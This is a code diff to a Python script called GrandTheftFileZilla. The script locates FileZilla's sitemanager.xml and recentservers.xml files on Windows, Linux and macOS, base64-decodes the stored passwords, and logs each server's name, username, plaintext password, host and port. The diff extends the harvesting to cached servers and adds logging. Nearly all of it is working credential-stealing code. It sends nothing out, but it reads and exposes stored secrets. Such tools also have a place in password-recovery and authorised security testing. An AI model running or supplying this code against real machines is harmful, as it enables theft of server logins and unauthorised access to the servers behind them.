@@ -23,6 +23,7 @@
 # SOFTWARE.
 
 import xml.etree.ElementTree
+import logging
 import base64
 import sys
 import os
@@ -31,26 +32,32 @@ class GrandTheftFileZilla:
     """The crawler thread executes the HTTP request using the HTTP handler.
 
     Attributes:
-        sitemanager_xml_locations (obj): All possible `sitemanager.xml` locations.
+        credentials_xml_locations (obj): All possible `sitemanager.xml` or `recentservers.xml` locations.
+        credentials_xml_filenames (arr): An array of possible filenames (since saved & cached servers are stored in different files).
         __credentials (arr): Contains all the credentials (if found).
 
     """
 
-    sitemanager_xml_locations = {
+    credentials_xml_locations = {
         "win": [
-            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "Roaming/FileZilla/sitemanager.xml"),
-            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "FileZilla/sitemanager.xml"),
-            os.path.join(os.environ["CSIDL_APPDATA"] if "CSIDL_APPDATA" in os.environ else "", "FileZilla/sitemanager.xml")
+            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "Roaming/FileZilla/[$filename].xml"),
+            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "FileZilla/[$filename].xml"),
+            os.path.join(os.environ["CSIDL_APPDATA"] if "CSIDL_APPDATA" in os.environ else "", "FileZilla/[$filename].xml")
         ],
         "linux": [
-            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
-            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
+            os.path.expanduser("~") + "/.filezilla/[$filename].xml",
+            os.path.expanduser("~") + "/.config/filezilla/[$filename].xml"
         ],
         "darwin": [
-            os.path.expanduser("~") + "/.filezilla/sitemanager.xml",
-            os.path.expanduser("~") + "/.config/filezilla/sitemanager.xml"
+            os.path.expanduser("~") + "/.filezilla/[$filename].xml",
+            os.path.expanduser("~") + "/.config/filezilla/[$filename].xml"
         ]
     }
+
+    credentials_xml_filenames = [
+        "sitemanager",
+        "recentservers"
+    ]
 
     def __init__(self):
         """Constructs a GrandTheftFileZilla instance."""
@@ -61,48 +68,65 @@ class GrandTheftFileZilla:
         """Extract credentials from the given xml location and add them to the credentials array.
 
         Args:
-            location (str): The location/filepath of the sitemanager XML file.
+            location (str): The location/filepath of the XML file.
 
         """
-        root = xml.etree.ElementTree.parse(location).getroot()
-        for server in root[0].findall("Server"):
-            usernm = server.find("User").text if hasattr(server.find("User"), "text") else ""
-            passwd = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
-            hostnm = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
-            portnb = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
 
-            self.__credentials.append((
-                usernm,
-                base64.b64decode(passwd).decode("utf-8"),
-                hostnm,
-                portnb
-            ))
+        root = xml.etree.ElementTree.parse(location).getroot()
+
+        if not root:
+            return
+
+        for server in root[0].findall("Server"):
+            namevl = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
+            uservl = server.find("User").text if hasattr(server.find("User"), "text") else ""
+            passvl = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
+            hostvl = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
+            portvl = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
+
+            passvl_str = base64.b64decode(passvl).decode("utf-8")
+
+            self.__credentials.append((namevl, uservl, passvl_str, hostvl, portvl))
 
     def get_credentials(self):
         """Iterate over the correct possible XML paths and extract and return the credentials."""
 
-        for location_platform in self.sitemanager_xml_locations:
+        locations_found = 0
+
+        for location_platform in self.credentials_xml_locations:
             if not sys.platform.startswith(location_platform):
                 continue
 
-            for location in self.sitemanager_xml_locations[location_platform]:
-                if os.path.exists(location):
-                    self.extract_credentials(location)
+            for location in self.credentials_xml_locations[location_platform]:
+                for filename in self.credentials_xml_filenames:
+                    parsed_location = location.replace("[$filename]", filename)
+
+                    if os.path.exists(parsed_location):
+                        locations_found += 1
+                        self.extract_credentials(parsed_location)
+
+        if not locations_found:
+            logging.warning("It looks like FileZilla isn't installed since no SiteManager XML's could be found.")
 
         return self.__credentials
 
 if __name__ == "__main__":
+    logging.basicConfig(
+        level=logging.INFO,
+        format='[%(asctime)s][%(levelname)s] %(message)s',
+        datefmt='%Y-%m-%d %H:%M:%S'
+    )
+
+    logging.info("Started searching for credentials stored in FileZilla.")
+
     credentials = GrandTheftFileZilla().get_credentials()
 
-    for (usernm, passwd, hostnm, portnb) in credentials:
-        credential = usernm
+    if credentials:
+        logging.info(str(len(credentials)) + " servers with credentials found.")
+    else:
+        logging.warning("No servers with credentials found.")
 
-        if len(passwd):
-            credential += ":" + passwd
+    for (namevl, uservl, passvl, hostvl, portvl) in credentials:
+        logging.info("Server found.\n    Name: " + namevl + " \n    User: " + uservl + " \n    Pass: " + passvl + " \n    Host: " + hostvl + " \n    Port: " + portvl)
 
-        credential += "@" + hostnm
-
-        if len(portnb):
-            credential += ":" + portnb
-
-        print(credential)
+    logging.info("Finished searching.")
